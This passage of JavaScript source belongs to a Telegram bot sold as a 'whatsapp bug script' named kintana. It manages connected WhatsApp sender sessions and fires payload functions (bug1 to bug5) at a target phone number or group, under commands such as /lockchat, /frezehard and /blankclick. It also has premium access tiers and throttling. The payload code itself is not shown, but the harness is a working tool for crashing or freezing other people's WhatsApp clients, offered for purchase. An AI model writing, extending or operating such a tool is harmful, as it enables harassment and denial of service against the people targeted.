  <tg-button type="callback_data" data="all_menu" style="primary">all menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="kintana-menu" style="primary">kintana menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="thanks_to" style="primary">thanks to</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">channel</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
</tg-button-row>`;

  await sendRichMenu(chatId, html);
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "no username";
    const senderId = query.from.id;
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const greeting = getGreeting();

    let html = "";

    if (query.data === "owner_menu") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<p>premium and admin access menu, please register to be able to use the bug.</p>

<h3>bot whatsapp</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/botwa</code></td><td>add bot whatsapp</td></tr>
<tr><td><code>/delbotwa</code></td><td>delete bot whatsapp</td></tr>
<tr><td><code>/listbotwa</code></td><td>list bot whatsapp</td></tr>
</table>

<h3>connect menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/addsenderpublic</code></td><td>add sender public</td></tr>
<tr><td><code>/addsenderprivat</code></td><td>add sender private</td></tr>
<tr><td><code>/delsenderpublic</code></td><td>delete sender public</td></tr>
<tr><td><code>/delsenderprivat</code></td><td>delete sender private</td></tr>
<tr><td><code>/listsenderpublic</code></td><td>list sender public</td></tr>
<tr><td><code>/listsenderprivat</code></td><td>list sender private</td></tr>
<tr><td><code>/listsender</code></td><td>list all senders</td></tr>
</table>

<h3>group murbug add</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/modemurbuggb</code></td><td>on / off (admin only)</td></tr>
</table>

<h3>security</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/blockcmd</code></td><td>on / off (owner only)</td></tr>
<tr><td><code>/block /command</code></td><td>block a specific command</td></tr>
<tr><td><code>/unblock /command</code></td><td>unblock a command</td></tr>
<tr><td><code>/listblock</code></td><td>list blocked commands</td></tr>
</table>

<h3>access menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/addowner</code></td><td>user id</td></tr>
<tr><td><code>/delowner</code></td><td>user id</td></tr>
<tr><td><code>/addprem</code></td><td>user id</td></tr>
<tr><td><code>/delprem</code></td><td>user id</td></tr>
<tr><td><code>/listprem</code></td><td>list premium</td></tr>
<tr><td><code>/listowner</code></td><td>list owner</td></tr>
<tr><td><code>/setjeda</code></td><td>set delay on bug features</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "bug_info") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<p>before using the bug feature, you must read this first so you don't make a mistake using it.</p>

<h3>rules</h3>
<table border="2">
<tr><th>#</th><th>rule</th></tr>
<tr><td>1</td><td>don't bug random numbers, especially if the target did nothing wrong</td></tr>
<tr><td>2</td><td>avoid new sender / nokos (free), because it's prone to limits / blocks</td></tr>
<tr><td>3</td><td>don't spam bugs excessively</td></tr>
<tr><td>4</td><td>use <code>/setjeda</code> so the process is smoother</td></tr>
<tr><td>5</td><td>prioritize old / stable numbers. the stronger your number, the more optimal</td></tr>
</table>

<h3>if error</h3>
<table border="2">
<tr><th>problem</th><th>solution</th></tr>
<tr><td>can't pair / connect number</td><td>try another number that's still stable</td></tr>
<tr><td>bug doesn't work</td><td>check the target condition first. maybe the target is strong or your sender is being limited</td></tr>
<tr><td>your number is safe but still having problems</td><td>contact @heysaka to check your script</td></tr>
</table>

<p>don't minus the literacy okay</p>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="callback_data" data="kintana-menu" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "all_menu") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>
<p>all menu contains all the features available in this bot.</p>

<h3>tools menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/info</code></td><td>check telegram id</td></tr>
<tr><td><code>/tourl</code></td><td>convert media to url</td></tr>
<tr><td><code>/cekfunc</code></td><td>check bug function</td></tr>
<tr><td><code>/tiktok</code></td><td>tiktok downloader</td></tr>
<tr><td><code>/pinterest</code></td><td>search pinterest</td></tr>
</table>

<h3>fun menu</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/brat</code></td><td>make brat sticker</td></tr>
<tr><td><code>/play</code></td><td>search youtube music</td></tr>
<tr><td><code>/jadihitam</code></td><td>change skin to black</td></tr>
<tr><td><code>/jadianime</code></td><td>change photo to anime</td></tr>
<tr><td><code>/iqc</code></td><td>iphone quotes whatsapp</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "kintana-menu") {
      const { html: kHtml } = getkintanaMenu();
      html = kHtml;
    }

    else if (query.data === "toggle_public") {
      senderPublicEnabled = !senderPublicEnabled;
      await bot.answerCallbackQuery(query.id, { text: `sender public ${senderPublicEnabled ? "on" : "off"}`, show_alert: false });
      const { html: kHtml } = getkintanaMenu();
      html = kHtml;
    }

    else if (query.data === "toggle_private") {
      senderPrivateEnabled = !senderPrivateEnabled;
      await bot.answerCallbackQuery(query.id, { text: `sender private ${senderPrivateEnabled ? "on" : "off"}`, show_alert: false });
      const { html: kHtml } = getkintanaMenu();
      html = kHtml;
    }

    else if (query.data === "thanks_to") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>
<table border="2">
<tr><th>role</th><th>name</th></tr>
<tr><td>creator</td><td>heysaka official id</td></tr>
<tr><td>friend</td><td>niel</td></tr>
<tr><td>friend</td><td>kintana buyer</td></tr>
</table>

<p>and to all kintana script users, thank you for your support.</p>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://instagram.com/@sakaurbans" style="primary">instagram</tg-button>
  <tg-button type="url" url="https://youtube.com/@sakaurbansoffc" style="primary">youtube</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">telegram</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;
    }

    else if (query.data === "back_to_main") {
      html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<h3>${greeting}, ${username.toLowerCase()}</h3>

<p>i am a whatsapp bug script kintana version 10.0.0, created by heysaka.</p>

<tg-song>
  <audio controls preload="none" src="https://mp3tourl.com/audio/1791570807413-0fee70d1-28d3-4523-8bcc-4e56625245dc.mp3"></audio>
  <footer style="font-size:12px; color:#888; margin-top:6px;">
    © 2026 - Kintana Bot Telegram 
  </footer>
</tg-song>

<h3>information</h3>
<table border="2">
  <tr><th>info</th><th>detail</th></tr>
  <tr><td>creator</td><td>heysaka official id</td></tr>
  <tr><td>tiktok</td><td>https://www.tiktok.com/@h3ysaka</td></tr>
  <tr><td>version</td><td>10.0.0</td></tr>
  <tr><td>bot name</td><td>kintana</td></tr>
  <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
  <tr><td>status</td><td>${premiumStatus.toLowerCase()}</td></tr>
</table>

<tg-button-row>
  <tg-button type="callback_data" data="owner_menu" style="primary">owner menu</tg-button>
  <tg-button type="callback_data" data="all_menu" style="primary">all menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="kintana-menu" style="primary">kintana menu</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="thanks_to" style="primary">thanks to</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">channel</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaoffcbot" style="primary">buy script</tg-button>
</tg-button-row>`;
    }

    if (html) {
      await editRichMenu(chatId, messageId, html);
      await bot.answerCallbackQuery(query.id);
    }

  } catch (error) {
    console.error("error handling callback query:", error);
    try {
      await bot.answerCallbackQuery(query.id, { text: "an error occurred: " + error.message, show_alert: true });
    } catch (e) {}
  }
});

bot.onText(/^\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const type = command === "addsenderpublic" ? "public" : "private";
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  const input = match[2];
  if (!input) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${command}</td></tr>
<tr><td>example</td><td>/${command} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId, type, userId);
  } catch (error) {
    console.error(`error in ${command}:`, error);
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to connect</td></tr>
<tr><td>message</td><td>${error.message}</td></tr>
</table>`
    );
  }
});

bot.onText(/^\/(delsenderpublic|delsenderprivat)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const targetType = command === "delsenderpublic" ? "public" : "private";
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  const input = match[2];
  if (!input) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${command}</td></tr>
<tr><td>example</td><td>/${command} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  const token = bot.token;
  let statusMessageId = null;
  try {
    const html = `<h3>deleting bot</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>bot</td><td>${botNumber}</td></tr>
<tr><td>type</td><td>${targetType}</td></tr>
<tr><td>status</td><td>processing...</td></tr>
</table>`;
    const res = await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
      chat_id: chatId,
      rich_message: { html: RICH_CSS + html }
    });
    statusMessageId = res?.data?.result?.message_id;
  } catch (e) {
    console.error("failed to send status:", e?.message);
  }

  const editStatus = async (title, rows) => {
    if (!statusMessageId) return;
    let rowsHtml = "";
    for (const [k, v] of rows) rowsHtml += `<tr><td>${k}</td><td>${v}</td></tr>\n`;
    const html = `<h3>${title}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
${rowsHtml}
</table>`;
    try {
      await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
        chat_id: chatId,
        message_id: statusMessageId,
        rich_message: { html: RICH_CSS + html }
      });
    } catch (e) {
      console.error("failed to edit status:", e?.message);
    }
  };

  try {
    const sessionData = sessions.get(botNumber);

    if (sessionData) {
      if (sessionData.type !== targetType) {
        return await editStatus("error", [
          ["bot", botNumber],
          ["status", `this bot is a ${sessionData.type} sender`],
          ["note", `use /delsender${sessionData.type}`]
        ]);
      }

      const sock = sessionData.sock;
      try {
        await sock?.logout();
      } catch (err) {
        console.error("error logging out socket:", err);
      }

      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      removeActiveSession(botNumber);

      await editStatus("bot deleted", [
        ["bot", botNumber],
        ["type", targetType],
        ["status", "successfully deleted"]
      ]);
    } else {
      await editStatus("error", [
        ["bot", botNumber],
        ["status", "bot not found"]
      ]);
    }
  } catch (error) {
    console.error("error deleting bot:", error);
    await editStatus("error", [
      ["bot", botNumber],
      ["status", error.message]
    ]);
  }
});

const JEDA_PATH = path.join(__dirname, 'pause.json');

function loadConfig() {
    try {
        if (fs.existsSync(JEDA_PATH)) {
            const data = fs.readFileSync(JEDA_PATH, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.log('error loading config:', error);
    }
    return { delayMs: 0, lastBugTime: 0 };
}

function saveConfig(config) {
    try {
        fs.writeFileSync(JEDA_PATH, JSON.stringify(config, null, 2));
        console.log('config saved to pause.json');
    } catch (error) {
        console.log('error saving config:', error);
    }
}

let jedalohyah = loadConfig();
let delayMs = jedalohyah.delayMs || 0;
let lastBugTime = jedalohyah.lastBugTime || 0;

console.log(`loaded delay: ${delayMs}ms`);

function getCurrentDelay() {
    return delayMs;
}

function updateDelay(newDelay) {
    delayMs = newDelay;
    jedalohyah.delayMs = newDelay;
    saveConfig(jedalohyah);
}

function updateLastBugTime() {
    lastBugTime = Date.now();
    jedalohyah.lastBugTime = lastBugTime;
    saveConfig(jedalohyah);
}

function getRemainingTime() {
    const elapsed = Date.now() - lastBugTime;
    const remaining = delayMs - elapsed;
    return remaining > 0 ? remaining : 0;
}

function formatDelay(ms) {
    if (ms === 0) return 'no delay';
    const seconds = ms / 1000;
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = Math.round(seconds % 60);
    if (remainingSeconds === 0) return `${minutes}m`;
    return `${minutes}m ${remainingSeconds}s`;
}

bot.onText(/^\/setjeda(?:\s(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return restricted(chatId);
  }

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/setjeda</td></tr>
<tr><td>example</td><td>/setjeda 5s / 2m / 1h</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const input = match[1].toLowerCase().trim();
  const timeUnit = input.slice(-1);
  const timeValue = parseInt(input.slice(0, -1));

  if (isNaN(timeValue) || !['s', 'm', 'h'].includes(timeUnit)) {
    return sendRichMenu(chatId,
      `<h3>invalid format</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/setjeda 5s / 2m / 1h</td></tr>
</table>`,
      msg.message_id
    );
  }

  let newDelay = 0;
  if (timeUnit === 's') newDelay = timeValue * 1000;
  if (timeUnit === 'm') newDelay = timeValue * 60 * 1000;
  if (timeUnit === 'h') newDelay = timeValue * 60 * 60 * 1000;

  updateDelay(newDelay);
  updateLastBugTime();

  await sendRichMenu(chatId,
    `<h3>delay set</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>delay</td><td>${input}</td></tr>
<tr><td>duration</td><td>${formatDelay(delayMs)}</td></tr>
<tr><td>saved in</td><td>pause.json</td></tr>
</table>`,
    msg.message_id
  );
});

bot.onText(/^\/cekjeda$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return restricted(chatId);
  }

  const remaining = getRemainingTime();
  let status = 'ready to use';
  if (remaining > 0) status = `wait ${formatDelay(remaining)} more`;

  await sendRichMenu(chatId,
    `<h3>delay info</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>delay</td><td>${formatDelay(delayMs)}</td></tr>
<tr><td>in ms</td><td>${delayMs}ms</td></tr>
<tr><td>saved in</td><td>pause.json</td></tr>
<tr><td>status</td><td>${status}</td></tr>
</table>`
  );
});

bot.onText(/^\/resetjeda$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return restricted(chatId);
  }

  updateDelay(0);
  updateLastBugTime();
  await sendRichMenu(chatId,
    `<h3>delay reset</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>successfully reset to 0</td></tr>
<tr><td>note</td><td>no delay mode</td></tr>
</table>`
  );
});

async function sendBugSuccess(chatId, formattedNumber, commandName, replyToMsgId = null) {
  const html = `<h3>bug has been sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>target</td><td>${formattedNumber}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>script version</td><td>10.0.0</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="https://wa.me/${formattedNumber}" style="primary">check target</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaOfficial/41" style="primary">rating script</tg-button>
</tg-button-row>`;
  await sendRichMenu(chatId, html, replyToMsgId);
}

bot.onText(/^\/(delayhard)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug1(sock, target);
        bug1(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(lockchat)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug2(sock, target);
        bug2(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(blankclick)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug3(sock, target);
        bug3(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug4(sock, target);
        bug4(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(desahanmanja)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug5(sock, target);
        bug5(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing group link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
